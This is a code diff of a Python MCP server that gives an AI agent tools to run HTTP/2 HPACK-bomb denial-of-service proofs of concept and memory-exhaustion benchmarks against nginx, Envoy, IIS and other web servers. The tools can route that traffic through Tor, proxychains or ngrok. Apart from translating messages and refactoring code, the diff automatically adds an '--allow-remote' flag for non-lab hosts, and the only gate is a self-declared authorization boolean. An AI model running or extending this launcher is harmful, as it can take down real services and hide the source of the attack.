@@ -10,7 +10,6 @@ from __future__ import annotations
 
 import json
 import os
-import socket
 import ssl
 import subprocess
 import sys
@@ -31,6 +30,11 @@ CONFIG_DIR = PLUGIN_ROOT / "config"
 TUNNEL_CONFIG_PATH = CONFIG_DIR / "tunnel.json"
 
 sys.path.insert(0, str(BENCH_DIR))
+from authorization import (  # noqa: E402
+    check_authorization,
+    is_lab_host,
+    reject_message,
+)
 from tunnel import (  # noqa: E402
     TUNNEL_MODES,
     TunnelConfig,
@@ -49,11 +53,11 @@ Profile = Literal["probe", "safe", "moderate", "aggressive"]
 mcp = FastMCP(
     "http2-bomb",
     instructions=(
-        "HTTP/2 HPACK-bomb DoS PoCs (califio/publications). Nur auf autorisierte Ziele. "
-        "Zuerst probe_http2, dann run_http2_bomb_test mit authorization_confirmed=true "
-        "und scope_description. Profile: probe/safe/moderate/aggressive. "
-        "Tunnel: configure_http2_bomb_tunnel oder tunnel_mode/proxy_url auf Run-Tools. "
-        "OOM-Benchmark: run_http2_bomb_benchmark, Logs: get_http2_bomb_benchmark_logs."
+        "HTTP/2 HPACK-bomb DoS PoCs (califio/publications). Authorized targets only. "
+        "Run probe_http2 first, then run_http2_bomb_test with authorization_confirmed=true "
+        "and scope_description. Profiles: probe/safe/moderate/aggressive. "
+        "Tunnel: configure_http2_bomb_tunnel or tunnel_mode/proxy_url on run tools. "
+        "OOM benchmark: run_http2_bomb_benchmark; logs: get_http2_bomb_benchmark_logs."
     ),
 )
 
@@ -155,48 +159,17 @@ PROFILE_LIMITS: dict[Profile, dict[str, Any]] = {
 }
 
 
-def _load_allowlist() -> list[dict[str, Any]]:
-    if not ALLOWLIST_PATH.exists():
-        return []
-    try:
-        data = json.loads(ALLOWLIST_PATH.read_text(encoding="utf-8"))
-        return data if isinstance(data, list) else []
-    except (json.JSONDecodeError, OSError):
-        return []
-
-
-def _host_allowed(host: str) -> tuple[bool, str]:
-    entries = _load_allowlist()
-    if not entries:
-        return True, "Kein allowlist — nur authorization_confirmed erforderlich."
-    host_l = host.strip().lower()
-    for entry in entries:
-        if not isinstance(entry, dict):
-            continue
-        h = str(entry.get("host", "")).strip().lower()
-        if h and (host_l == h or host_l.endswith("." + h)):
-            return True, f"Ziel in allowlist: {h}"
-    return (
-        False,
-        f"Host '{host}' nicht in {ALLOWLIST_PATH}. Eintrag hinzufügen oder Datei entfernen.",
-    )
-
-
 def _check_authorization(
     authorization_confirmed: bool,
     scope_description: str,
     host: str,
 ) -> str | None:
-    if not authorization_confirmed:
-        return (
-            "authorization_confirmed muss true sein (schriftliche Erlaubnis für dieses Ziel)."
-        )
-    if len(scope_description.strip()) < 12:
-        return "scope_description zu kurz (min. 12 Zeichen, z. B. Kunde/Ticket/Scope)."
-    ok, msg = _host_allowed(host)
-    if not ok:
-        return msg
-    return None
+    return check_authorization(
+        authorization_confirmed,
+        scope_description,
+        host,
+        ALLOWLIST_PATH,
+    )
 
 
 def _apply_tunnel(
@@ -234,7 +207,7 @@ def _probe_http2(host: str, port: int, server_name: str | None, timeout: float =
         sock.settimeout(2.0)
         try:
             peek = sock.recv(4096)
-        except socket.timeout:
+        except TimeoutError:
             peek = b""
         return {
             "reachable": True,
@@ -330,7 +303,7 @@ def _build_argv(
 def _estimate(variant: VariantMeta, profile: Profile) -> str:
     lim = PROFILE_LIMITS[profile]
     if profile == "probe":
-        return "Kein Memory-Impact — nur TLS/ALPN/H2-Preface-Check."
+        return "No memory impact — TLS/ALPN/H2 preface check only."
 
     if variant.kind == "nginx":
         h = int(lim["headers"])
@@ -344,19 +317,19 @@ def _estimate(variant: VariantMeta, profile: Profile) -> str:
         mem_s = f"~{mem_mb:.2f} MB" if mem_mb < 1 else f"~{mem_mb:.0f} MB"
         wire_s = f"~{wire_mb * 1024:.0f} KB" if wire_mb < 0.05 else f"~{wire_mb:.1f} MB"
         return (
-            f"Modell ({variant.id}): {mem_s} Server-RAM, "
-            f"{wire_s} wire, ~{amp:.0f}:1 ({variant.amplification} publiziert)."
+            f"Model ({variant.id}): {mem_s} server RAM, "
+            f"{wire_s} wire, ~{amp:.0f}:1 ({variant.amplification} published)."
         )
 
     if variant.kind == "cookie":
         refs = int(lim["refs"])
         merge = refs * (refs + 1) + refs
         return (
-            f"Modell ({variant.id}): cookie-merge ~{merge / 1024 / 1024:.1f} MiB/refs, "
-            f"publiziert {variant.amplification}."
+            f"Model ({variant.id}): cookie-merge ~{merge / 1024 / 1024:.1f} MiB/refs, "
+            f"published {variant.amplification}."
         )
 
-    return f"IIS preset — siehe PoC README ({variant.amplification})."
+    return f"IIS preset — see PoC README ({variant.amplification})."
 
 
 def _benchmark_modes_for_variant(variant_id: str) -> str:
@@ -378,10 +351,10 @@ def _benchmark_modes_for_variant(variant_id: str) -> str:
 
 @mcp.tool()
 async def list_http2_bomb_variants() -> str:
-    """Listet verfügbare Server-Varianten, Pfade, Amplification und Fix-Status."""
+    """List available server variants, paths, amplification, and fix status."""
     lines = [
-        "HTTP/2 Bomb — Varianten (califio/publications)",
-        f"PoC-Root: {POC_ROOT}",
+        "HTTP/2 Bomb — variants (califio/publications)",
+        f"PoC root: {POC_ROOT}",
         "",
     ]
     seen: set[str] = set()
@@ -389,8 +362,8 @@ async def list_http2_bomb_variants() -> str:
         if v.id in seen:
             continue
         seen.add(v.id)
-        fixed = v.fixed_in or "offen / unbekannt"
-        exists = "OK" if v.script.is_file() else "FEHLT"
+        fixed = v.fixed_in or "open / unknown"
+        exists = "OK" if v.script.is_file() else "MISSING"
         bench_modes = _benchmark_modes_for_variant(v.id)
         lines.append(
             f"- {v.id}: {v.label} | amp {v.amplification} | fix: {fixed} | "
@@ -400,7 +373,7 @@ async def list_http2_bomb_variants() -> str:
     lines += [
         "",
         "Profile: probe | safe | moderate | aggressive",
-        "Benchmark: run_http2_bomb_benchmark mit variant= + mode= (apex*, apex_cookie*, apex_iis_mp)",
+        "Benchmark: run_http2_bomb_benchmark with variant= + mode= (apex*, apex_cookie*, apex_iis_mp)",
         f"Allowlist (optional): {ALLOWLIST_PATH}",
     ]
     return "\n".join(lines)
@@ -420,15 +393,15 @@ async def configure_http2_bomb_tunnel(
     test_port: int = 443,
 ) -> str:
     """
-    Konfiguriert Tunnel-Routing für PoC/Benchmark (direct, socks5, http, tor, proxychains, ngrok, cloudflared).
+    Configure tunnel routing for PoC/benchmark (direct, socks5, http, tor, proxychains, ngrok, cloudflared).
 
     - mode: none | socks5 | http | tor | proxychains | ngrok | cloudflared
-    - proxy_url: z. B. socks5://127.0.0.1:9050 oder http://user:pass@proxy:8080
-    - save: Profil nach config/tunnel.json und ~/.config/http2-bomb/tunnel.json schreiben
-    - test_host: optional Erreichbarkeitstest durch den Tunnel
+    - proxy_url: e.g. socks5://127.0.0.1:9050 or http://user:pass@proxy:8080
+    - save: write profile to config/tunnel.json and ~/.config/http2-bomb/tunnel.json
+    - test_host: optional connectivity test through the tunnel
     """
     if mode not in TUNNEL_MODES:
-        return f"Unbekannter mode '{mode}'. Erlaubt: {', '.join(TUNNEL_MODES)}"
+        return f"Unknown mode '{mode}'. Allowed: {', '.join(TUNNEL_MODES)}"
 
     overrides: dict[str, Any] = {"mode": mode}
     if proxy_url.strip():
@@ -457,23 +430,23 @@ async def configure_http2_bomb_tunnel(
                 pass
 
     lines = [
-        "HTTP/2 Bomb — Tunnel konfiguriert",
+        "HTTP/2 Bomb — tunnel configured",
         activated.summary(),
-        f"PySocks: {'ja' if activated.effective_proxy_url() and mode != 'proxychains' else 'optional'}",
+        f"PySocks: {'yes' if activated.effective_proxy_url() and mode != 'proxychains' else 'optional'}",
     ]
     if saved_paths:
-        lines.append("Gespeichert: " + ", ".join(saved_paths))
+        lines.append("Saved: " + ", ".join(saved_paths))
 
     if test_host.strip():
         result = test_tunnel_connectivity(test_host.strip(), test_port)
-        lines.append(f"Connectivity-Test: {json.dumps(result, indent=2)}")
+        lines.append(f"Connectivity test: {json.dumps(result, indent=2)}")
 
     lines += [
         "",
-        "Hinweise:",
-        "- tor: SOCKS5 127.0.0.1:9050 (Tor daemon) oder proxychains ohne PySocks",
-        "- cloudflared: cloudflared access tcp … dann cloudflared_proxy=socks5://127.0.0.1:PORT",
-        "- ngrok: ngrok tcp 443 starten, ngrok_addr aus API oder manuell setzen",
+        "Notes:",
+        "- tor: SOCKS5 127.0.0.1:9050 (Tor daemon) or proxychains without PySocks",
+        "- cloudflared: cloudflared access tcp … then cloudflared_proxy=socks5://127.0.0.1:PORT",
+        "- ngrok: start ngrok tcp 443, set ngrok_addr from API or manually",
         "- proxychains: proxychains4 -f /etc/proxychains.conf …",
     ]
     return "\n".join(lines)
@@ -488,8 +461,8 @@ async def probe_http2(
     proxy_url: str = "",
 ) -> str:
     """
-    Prüft Erreichbarkeit, TLS und HTTP/2 (ALPN h2). Sendet keinen HPACK-Bomb — unbedenklich.
-    Optional tunnel_mode/proxy_url für Routing über SOCKS/HTTP-Proxy.
+    Check reachability, TLS, and HTTP/2 (ALPN h2). Does not send an HPACK bomb — safe to run.
+    Optional tunnel_mode/proxy_url for SOCKS/HTTP proxy routing.
     """
     if tunnel_mode.strip() or proxy_url.strip():
         _apply_tunnel(tunnel_mode=tunnel_mode or None, proxy_url=proxy_url or None)
@@ -506,11 +479,11 @@ async def estimate_http2_bomb_impact(
     variant: Variant = "nginx",
     profile: Profile = "moderate",
 ) -> str:
-    """Schätzt Auswirkung für Variante/Profil ohne Angriff auszuführen."""
+    """Estimate impact for variant/profile without running an attack."""
     if variant == "auto":
         variant = "nginx"
     if variant not in VARIANTS:
-        return f"Unbekannte Variante: {variant}"
+        return f"Unknown variant: {variant}"
     return _estimate(VARIANTS[variant], profile)
 
 
@@ -535,21 +508,21 @@ async def run_http2_bomb_test(
     proxychains_conf: str = "",
 ) -> str:
     """
-    Führt den HTTP/2 HPACK-Bomb-PoC aus (nur autorisierte Ziele).
+    Run the HTTP/2 HPACK bomb PoC (authorized targets only).
 
-    - authorization_confirmed: true nur mit dokumentierter Erlaubnis
-    - scope_description: Ticket/Kunde/Scope (min. 12 Zeichen)
+    - authorization_confirmed: true only with documented permission
+    - scope_description: ticket/customer/scope (min. 12 characters)
     - variant: nginx | httpd | envoy | pingora | microsoft-iis | auto (→ nginx)
-    - profile: probe (nur H2-Check) | safe | moderate | aggressive
+    - profile: probe (H2 check only) | safe | moderate | aggressive
     """
     if variant == "auto":
         variant = "nginx"
     if variant not in VARIANTS:
-        return f"Unbekannte Variante: {variant}. Nutze list_http2_bomb_variants."
+        return f"Unknown variant: {variant}. Use list_http2_bomb_variants."
 
     err = _check_authorization(authorization_confirmed, scope_description, host)
     if err:
-        return f"ABGELEHNT: {err}"
+        return reject_message(err)
 
     if tunnel_mode.strip() or proxy_url.strip() or proxychains_conf.strip():
         cfg = _apply_tunnel(
@@ -572,8 +545,8 @@ async def run_http2_bomb_test(
 
     if meta.platform == "windows" and sys.platform != "win32":
         return (
-            f"IIS-PoC ({meta.script.name}) ist für Windows gedacht. "
-            "Auf Linux nur probe_http2 oder Remote-Windows-Agent nutzen."
+            f"IIS PoC ({meta.script.name}) requires Windows. "
+            "On Linux use probe_http2 or a remote Windows agent only."
         )
 
     extra: dict[str, Any] = {}
@@ -607,12 +580,12 @@ async def run_http2_bomb_test(
     estimate = _estimate(meta, profile)
     header = (
         f"HTTP/2 Bomb Test\n"
-        f"Ziel: {host}:{port}\n"
-        f"Variante: {meta.id} | Profil: {profile}\n"
+        f"Target: {host}:{port}\n"
+        f"Variant: {meta.id} | Profile: {profile}\n"
         f"Scope: {scope_description.strip()}\n"
         f"Tunnel: {cfg.summary()}\n"
-        f"Schätzung: {estimate}\n"
-        f"Befehl: {' '.join(argv)}\n"
+        f"Estimate: {estimate}\n"
+        f"Command: {' '.join(argv)}\n"
         f"Timeout: {max_runtime}s\n"
         "---\n"
     )
@@ -630,9 +603,9 @@ async def run_http2_bomb_test(
             env=env,
         )
     except subprocess.TimeoutExpired:
-        return header + f"TIMEOUT nach {max_runtime}s (Prozess beendet)."
+        return header + f"TIMEOUT after {max_runtime}s (process terminated)."
     except FileNotFoundError as exc:
-        return header + f"FEHLER: {exc}"
+        return header + f"ERROR: {exc}"
 
     elapsed = time.monotonic() - t0
     out = (proc.stdout or "") + (proc.stderr or "")
@@ -644,7 +617,7 @@ async def run_http2_bomb_test(
 
 @mcp.tool()
 async def get_http2_bomb_disclosure() -> str:
-    """CVE/Fix-Status laut califio/publications README."""
+    """CVE/fix status per califio/publications README."""
     return """HTTP/2 Bomb — Disclosure (califio/publications)
 
 - nginx: fixed in 1.29.8 — max_headers directive
@@ -655,9 +628,9 @@ async def get_http2_bomb_disclosure() -> str:
 
 - Microsoft IIS, Envoy, Cloudflare Pingora: reported May 2026 — fix status unknown
 
-Quelle: https://github.com/califio/publications/tree/main/MADBugs/http2-bomb
+Source: https://github.com/califio/publications/tree/main/MADBugs/http2-bomb
 
-Nur auf eigene Systeme oder mit schriftlicher Kundenfreigabe testen."""
+Test only systems you own or have written customer authorization for."""
 
 
 @mcp.tool()
@@ -675,17 +648,17 @@ async def run_http2_bomb_benchmark(
     proxychains_conf: str = "",
 ) -> str:
     """
-    Startet OOM-Benchmark via benchmark_runner.py. Loggt jeden Run nach benchmark/logs/.
+    Start OOM benchmark via benchmark_runner.py. Logs each run to benchmark/logs/.
 
     variant: nginx | pingora | httpd | envoy | microsoft-iis
     mode: ramp | burst | apex | apex_scaled | apex_mp | apex_cookie* | apex_iis_mp | ...
     """
     err = _check_authorization(authorization_confirmed, scope_description, host)
     if err:
-        return f"ABGELEHNT: {err}"
+        return reject_message(err)
 
     if not BENCH_RUNNER.is_file():
-        return f"Benchmark-Harness fehlt: {BENCH_RUNNER}"
+        return f"Benchmark harness missing: {BENCH_RUNNER}"
 
     tunnel_cfg = _apply_tunnel(
         tunnel_mode=tunnel_mode or None,
@@ -700,20 +673,20 @@ async def run_http2_bomb_benchmark(
         "pipelined_sustain", "full_campaign",
     }
     if mode not in valid_modes:
-        return f"Unbekannter mode '{mode}'. Erlaubt: {', '.join(sorted(valid_modes))}"
+        return f"Unknown mode '{mode}'. Allowed: {', '.join(sorted(valid_modes))}"
 
     if mode == "apex_iis_mp" and sys.platform != "win32":
         sys.path.insert(0, str(BENCH_DIR))
         try:
-            from iis_apex_runner import build_powershell_command
             from attack_config import profile_apex_iis_mp
+            from iis_apex_runner import build_powershell_command
 
             preset = profile_apex_iis_mp(iis_preset)
             cmd = build_powershell_command(host, port, preset, scope_description)
             return (
-                f"IIS apex_iis_mp erfordert Windows für die Ausführung.\n"
+                f"IIS apex_iis_mp requires Windows to execute.\n"
                 f"Scope: {scope_description.strip()}\n\n"
-                f"PowerShell auf Windows Server:\n{cmd}"
+                f"PowerShell on Windows Server:\n{cmd}"
             )
         except Exception as exc:
             return f"IIS apex_iis_mp: {exc}"
@@ -741,15 +714,18 @@ async def run_http2_bomb_benchmark(
     if mode == "apex_iis_mp":
         argv += ["--iis-preset", iis_preset]
 
+    if not is_lab_host(host):
+        argv += ["--allow-remote"]
+
     timeout = 7200 if mode == "full_campaign" else 3600
     header = (
         f"HTTP/2 Bomb Benchmark\n"
-        f"Ziel: {host}:{port}\n"
+        f"Target: {host}:{port}\n"
         f"Variant: {variant} | Mode: {mode} | Connections: {connections}\n"
         f"Tunnel: {tunnel_cfg.summary()}\n"
         f"Scope: {scope_description.strip()}\n"
         f"Logs: {BENCH_CSV}\n"
-        f"Befehl: {' '.join(argv)}\n"
+        f"Command: {' '.join(argv)}\n"
         f"Timeout: {timeout}s\n---\n"
     )
 
@@ -766,7 +742,7 @@ async def run_http2_bomb_benchmark(
             env=env,
         )
     except subprocess.TimeoutExpired:
-        return header + f"TIMEOUT nach {timeout}s — Teil-Logs in {BENCH_CSV}"
+        return header + f"TIMEOUT after {timeout}s — partial logs in {BENCH_CSV}"
 
     elapsed = time.monotonic() - t0
     out = (proc.stdout or "") + (proc.stderr or "")
@@ -778,18 +754,18 @@ async def run_http2_bomb_benchmark(
 
 @mcp.tool()
 async def get_http2_bomb_benchmark_logs(last_n: int = 10) -> str:
-    """Liest die letzten N Benchmark-Runs aus benchmark_results.csv."""
+    """Read the last N benchmark runs from benchmark_results.csv."""
     if not BENCH_CSV.is_file():
-        return f"Keine Logs — CSV fehlt: {BENCH_CSV}"
+        return f"No logs — CSV missing: {BENCH_CSV}"
 
     lines = BENCH_CSV.read_text(encoding="utf-8").strip().splitlines()
     if len(lines) <= 1:
-        return "CSV vorhanden, aber noch keine Runs."
+        return "CSV exists but contains no runs yet."
 
     header = lines[0]
     rows = lines[1:]
     tail = rows[-max(1, min(last_n, 50)) :]
-    return header + "\n" + "\n".join(tail) + f"\n\n---\nGesamt: {len(rows)} Runs | Pfad: {BENCH_CSV}"
+    return header + "\n" + "\n".join(tail) + f"\n\n---\nTotal: {len(rows)} runs | Path: {BENCH_CSV}"
 
 
 def main() -> None:
